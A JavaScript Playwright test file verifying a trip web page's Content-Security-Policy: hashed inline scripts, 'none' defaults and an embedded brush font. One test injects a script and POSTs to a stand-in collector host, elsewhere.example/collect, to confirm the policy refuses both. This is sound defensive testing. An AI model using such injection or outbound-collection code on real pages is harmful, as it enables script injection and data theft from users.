// The page's own Content-Security-Policy (ADR-20261001-page-csp). Every test already fails when the policy refuses
// anything (tests/support/fixtures.mjs); these pin what the policy is: every inline script allowed by its hash and nothing
// else inline, and code, data and images only from or to the hosts the page uses.
import crypto from 'node:crypto';
import { test, expect, openTrip } from '../support/fixtures.mjs';
/* global TRIP -- the trip data, read inside the page */

const policyOf = async (page) => {
	const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
	return Object.fromEntries(
		csp.split(';').map((d) => {
			const [k, ...v] = d.trim().split(/\s+/);
			return [k, v];
		}),
	);
};

test('the policy allows each inline script by its hash, and nothing inline besides', async ({ page, request }) => {
	await openTrip(page);
	const p = await policyOf(page);
	const html = await (await request.get('/trip.html')).text();
	const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(
		(m) => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`,
	);
	expect(scripts.length).toBeGreaterThan(0);
	for (const h of scripts) expect(p['script-src']).toContain(h);
	expect(p['script-src']).not.toContain("'unsafe-inline'");
	expect(p['default-src']).toEqual(["'none'"]);
	for (const d of ['object-src', 'base-uri', 'form-action']) expect(p[d], d).toEqual(["'none'"]);
});

test('a script the page did not ship, and a host it does not use, are both refused', async ({ page, pageErrors }) => {
	await openTrip(page);
	const before = pageErrors.length;
	const refused = await page.evaluate(async () => {
		const seen = [];
		document.addEventListener('securitypolicyviolation', (e) => seen.push(e.effectiveDirective));
		const s = document.createElement('script');
		s.textContent = 'window.__injected = 1';
		document.head.appendChild(s);
		await fetch('https://elsewhere.example/collect', { method: 'POST', body: 'x' }).catch(() => {});
		await new Promise((r) => setTimeout(r, 200));
		return { seen, ran: window.__injected === 1 };
	});
	expect(refused.ran, 'an injected inline script must not run').toBe(false);
	expect(refused.seen).toEqual(expect.arrayContaining(['script-src-elem', 'connect-src']));
	// these refusals were the point: take them (and only them) off the fixture's error list
	await page.waitForTimeout(200);
	const others = pageErrors
		.splice(before)
		.filter((e) => !/CSP refused (script-src-elem|connect-src)|violates the following Content Security Policy|Refused to|elsewhere\.example/.test(e));
	pageErrors.push(...others);
});

test('the brush face comes in the page, so no font host holds the first paint', async ({ page }) => {
	await openTrip(page);
	const p = await policyOf(page);
	expect(p['font-src']).toEqual(['data:']);
	expect(p['style-src'].filter((h) => /fonts\./.test(h))).toEqual([]);
	expect(await page.locator('link[rel="stylesheet"], link[rel="preconnect"]').count(), 'no outside stylesheet in the head').toBe(0);
	// the build embeds the trip's brush face (it warns when it can't fetch one); the brand in the header letters in it
	const family = await page.evaluate(() => TRIP.brushFont || 'Ma Shan Zheng');
	await expect
		.poll(() =>
			page.evaluate(
				(f) => document.fonts.ready.then(() => [...document.fonts].some((x) => x.family.replace(/['"]/g, '') === f && x.status === 'loaded')),
				family,
			),
		)
		.toBe(true);
});
